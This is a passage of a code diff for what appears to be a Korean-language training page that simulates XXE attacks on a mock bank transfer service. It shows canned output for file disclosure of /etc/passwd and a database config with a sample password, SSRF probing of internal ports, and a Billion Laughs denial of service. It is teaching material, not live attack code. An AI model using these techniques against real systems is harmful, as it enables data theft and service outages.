+bankadmin:x:1001:1001:Bank Admin:/home/bankadmin:/bin/bash`;
+                
+                output.innerHTML = `<span class="text-red-400 font-bold">⚠️ XXE File Disclosure 공격 성공!</span>
+
+<span class="text-green-400">이체 처리 결과:</span>
+  출금계좌: 123-456-789
+  입금계좌: 987-654-321
+  금액: 1,000,000원
+  적요: <span class="text-red-400 font-bold">[시스템 파일 내용 유출]</span>
+
+<span class="text-red-400 font-bold">유출된 파일: /etc/passwd</span>
+${passwdContent}
+
+<span class="text-yellow-400">⚠️ 시스템 계정 정보 노출!</span>`;
+                
+                badge.innerText = 'XXE 공격';
+                badge.className = 'bg-red-500 text-white text-xs font-bold px-3 py-1 rounded animate-pulse-slow';
+                
+            } else if (type === 'db') {
+                addTerminalLine('> 파일 읽기: /var/www/bank/config/database.php', 'text-red-300');
+                await sleep(500);
+                addTerminalLine('> <?php', 'text-purple-300');
+                addTerminalLine('> $db_pass = "P@ssw0rd!2024#Shinhan"', 'text-red-400 font-bold');
+                
+                const dbConfig = `<?php
+$db_host = "localhost";
+$db_user = "bank_admin";
+$db_pass = "P@ssw0rd!2024#Shinhan";
+$db_name = "banking_system";
+$db_port = 3306;
+?>`;
+                
+                output.innerHTML = `<span class="text-red-400 font-bold">⚠️ XXE Database Configuration Leak!</span>
+
+<span class="text-red-400 font-bold">유출된 파일: database.php</span>
+${dbConfig}
+
+<span class="text-yellow-400 font-bold">⚠️ 데이터베이스 접속 정보 탈취!</span>
+<span class="text-red-300">→ 공격자가 전체 고객 DB 접근 가능</span>`;
+                
+                badge.innerText = 'DB 정보 유출';
+                badge.className = 'bg-red-600 text-white text-xs font-bold px-3 py-1 rounded animate-pulse-slow';
+            }
+
+            document.getElementById('damageScenario').classList.remove('hidden');
+            showJudgement('취약', 'External Entity를 통한 파일 시스템 접근 허용');
+        }
+
+        async function executeSSRFAttack() {
+            const output = document.getElementById('response-output');
+            const badge = document.getElementById('status-badge');
+            
+            document.getElementById('terminalOutput').classList.remove('hidden');
+            addTerminalLine('> XML Parser: ENTITY 처리 중...', 'text-blue-300');
+            await sleep(500);
+            addTerminalLine('> 외부 URL 접근: http://127.0.0.1:8080', 'text-orange-300');
+            await sleep(500);
+            addTerminalLine('> [!] 내부 네트워크 HTTP 요청', 'text-red-400 font-bold');
+            await sleep(700);
+            addTerminalLine('> 연결 성공: 200 OK', 'text-green-400');
+            await sleep(500);
+            addTerminalLine('> 응답 수신 중...', 'text-yellow-300');
+
+            output.innerHTML = `<span class="text-red-400 font-bold">⚠️ XXE-based SSRF 공격 성공!</span>
+
+<span class="text-purple-400">내부 포트 스캔 결과:</span>
+
+http://127.0.0.1:8080/admin/status
+  → <span class="text-green-400">200 OK</span>
+  → Admin Panel Detected
+  → Version: v2.4.1
+
+http://127.0.0.1:3306
+  → <span class="text-green-400">MySQL Server</span>
+  → Database: banking_system
+
+http://127.0.0.1:6379
+  → <span class="text-green-400">Redis Cache</span>
+  → PONG response
+
+<span class="text-yellow-400">⚠️ 내부 인프라 노출!</span>`;
+
+            badge.innerText = 'SSRF 공격';
+            badge.className = 'bg-purple-500 text-white text-xs font-bold px-3 py-1 rounded animate-pulse-slow';
+            
+            document.getElementById('damageScenario').classList.remove('hidden');
+            showJudgement('취약', 'External Entity를 통한 내부 네트워크 접근 허용');
+        }
+
+        async function executeDosAttack() {
+            const output = document.getElementById('response-output');
+            const badge = document.getElementById('status-badge');
+            
+            document.getElementById('terminalOutput').classList.remove('hidden');
+            addTerminalLine('> ENTITY lol 확장 중...', 'text-yellow-300');
+            await sleep(500);
+            addTerminalLine('> ENTITY lol2 확장: lol x 10', 'text-yellow-300');
+            await sleep(500);
+            addTerminalLine('> ENTITY lol3 확장: lol2 x 10 = lol x 100', 'text-orange-300');
+            await sleep(500);
+            addTerminalLine('> ENTITY lol4 확장: lol3 x 10 = lol x 1,000', 'text-orange-300');
+            await sleep(700);
+            addTerminalLine('> [!] 메모리 급증 감지!', 'text-red-400 font-bold');
+            await sleep(500);
+            addTerminalLine('> 메모리 사용: 8.2 GB / 16 GB', 'text-red-400');
+            await sleep(500);
+            addTerminalLine('> 메모리 사용: 14.8 GB / 16 GB', 'text-red-500 font-bold');
+
+            output.innerHTML = `<span class="text-red-400 font-bold">⚠️ Billion Laughs DoS 공격!</span>
+
+<span class="text-yellow-400">서버 리소스 상태:</span>
+  CPU: <span class="text-red-400 font-bold">99.8%</span> ████████████████████
+  Memory: <span class="text-red-400 font-bold">15.2 GB / 16 GB</span> ███████████████████▓
+  
+<span class="text-red-400 font-bold">⚠️ 엔티티 확장 폭발!</span>
+&lol; → "lol"
+&lol2; → &lol; x 10 = "lol" x 10
+&lol3; → &lol2; x 10 = "lol" x 100
+&lol4; → &lol3; x 10 = "lol" x 1,000
+최종 크기: <span class="text-red-400 font-bold">약 3 GB</span>
+
+<span class="text-red-400 font-bold">서버가 응답하지 않습니다...</span>
+<span class="text-yellow-400">정상 고객의 거래가 지연되고 있습니다!</span>`;
+
+            badge.innerText = 'DoS 공격';
+            badge.className = 'bg-orange-500 text-white text-xs font-bold px-3 py-1 rounded animate-shake';
+            
+            document.getElementById('damageScenario').classList.remove('hidden');
+            showJudgement('취약', 'Entity Expansion 제한 없음 - DoS 공격 가능');
+        }
+
+        function showNormalResult() {
+            const output = document.getElementById('response-output');
+            const badge = document.getElementById('status-badge');
+
+            output.innerHTML = `<span class="text-green-400">✅ 이체 처리 완료</span>
+
+<span class="text-slate-400">거래 정보:</span>
+  출금계좌: 123-456-789 (김철수)
+  입금계좌: 987-654-321 (이영희)
+  이체금액: 1,000,000원
+  적요: 급여이체
+  
+<span class="text-slate-400">처리 결과:</span>
+  거래번호: TXN202412080001234
+  처리시각: 2024-12-08 14:23:45
+  상태: <span class="text-green-400 font-bold">성공</span>
+  
+<span class="text-blue-400">잔액 안내:</span>
+  출금계좌 잔액: 12,450,000원`;
+
+            badge.innerText = '200 OK';
+            badge.className = 'bg-green-500 text-slate-900 text-xs font-bold px-3 py-1 rounded';
+            
+            showJudgement('양호', 'External Entity 처리 비활성화');
+        }
+
+        function showJudgement(result, evidence) {
+            const judgementBox = document.getElementById('judgementBox');
+            const judgement = document.getElementById('judgement');
+            const evidenceText = document.getElementById('evidence');
+            
+            if (result === '취약') {
+                judgement.innerHTML = '<span class="text-red-400">취약 (Vulnerable)</span>';
+            } else {
+                judgement.innerHTML = '<span class="text-green-400">양호 (Good)</span>';
+            }
+            
+            evidenceText.innerText = evidence;
+            judgementBox.classList.remove('hidden');
+        }
+
+        function addTerminalLine(text, className = 'text-green-300') {
+            const div = document.createElement('div');
+            div.className = className;
+            div.textContent = text;
+            document.getElementById('terminalLines').appendChild(div);
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
         }
     </script>
 </body>
